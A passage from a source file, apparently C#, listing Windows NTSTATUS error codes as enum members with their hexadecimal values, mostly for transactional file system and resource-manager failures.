        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,

        MaximumNtStatus = 0xffffffff
    }
}
